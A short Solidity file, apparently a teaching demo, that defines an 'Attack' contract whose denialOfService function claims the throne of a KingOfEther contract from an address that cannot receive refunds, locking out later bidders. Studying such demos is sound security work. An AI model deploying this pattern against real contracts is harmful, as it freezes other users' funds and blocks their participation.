//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./KingOfEther.sol";

contract Attack{
    function denialOfService(address _kingOfEtherAddress) public payable{
        KingOfEther kingOfEther = KingOfEther(_kingOfEtherAddress);
        kingOfEther.becomeTheNewKing{value: msg.value}();
    }
}

